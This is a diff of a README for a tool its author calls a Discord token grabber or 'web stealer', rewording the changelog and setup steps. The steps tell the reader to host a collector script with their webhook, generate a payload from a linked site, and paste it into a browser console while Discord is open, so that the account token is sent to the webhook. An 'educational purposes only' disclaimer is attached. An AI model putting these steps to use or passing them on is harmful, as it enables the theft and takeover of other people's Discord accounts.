@@ -4,8 +4,8 @@
 
 ## Logs
 
-- **July 14, 2023**: Rewrote [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.js) in Node.js for people who want to use node.js instead of python, no difference.
-- **Aug 14, 2023**: One month later, made a new discord server for support and questions, join [here](https://discord.gg/CUdzAEyYVK).
+- **July 14, 2023**: Rewrote [`server.py`](https://github.com/I-Skid/web-stealer/blob/main/server.js) in Node.js for those who prefer to use Node.js instead of Python. There's no difference in functionality.
+- **August 14, 2023**: Created a new Discord server for providing support and answering questions. Feel free to join us [here](https://discord.gg/CUdzAEyYVK).
 
 ## Platforms
 
@@ -13,15 +13,15 @@ Compatible with Windows, macOS, Linux, and any other operating system with a web
 
 ## Setup
 
-1. Upload the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script to a hosting service like [Replit](https://replit.com/) or your preferred hosting service.
-2. Replace [`YOUR WEBHOOK`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py#L6) in [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) with your desired webhook.
-3. Start the hosting service and copy the URL of [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py).
-4. Visit [this website](https://web-stealer.yuvi5000.repl.co/), select the payload, and enter the URL of [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py).
-5. Copy the generated payload and paste it into the browser console with Discord open. The token will be sent to the specified webhook.
+1. Upload the [`server.py`](https://github.com/I-Skid/web-stealer/blob/main/server.py) script to a hosting service such as [Replit](https://replit.com/) or your preferred hosting platform.
+2. Replace [`YOUR WEBHOOK`](https://github.com/I-Skid/web-stealer/blob/main/server.py#L6) in [`server.py`](https://github.com/I-Skid/web-stealer/blob/main/server.py) with your desired webhook URL.
+3. Start the hosting service and copy the URL where [`server.py`](https://github.com/I-Skid/web-stealer/blob/main/server.py) is hosted.
+4. Visit [this website](https://web-stealer.yuvi5000.repl.co/), select the payload, and enter the URL of your hosted [`server.py`](https://github.com/I-Skid/web-stealer/blob/main/server.py).
+5. Copy the generated payload and paste it into the browser console while Discord is open. The token will be sent to the specified webhook.
 
 ## Important
 
-This program is for educational purposes only. I am not liable for any damage caused by this software.
+This program is intended for educational purposes only. I am not liable for any damage caused by the use of this software.
 
 ## Encountering Errors?
 
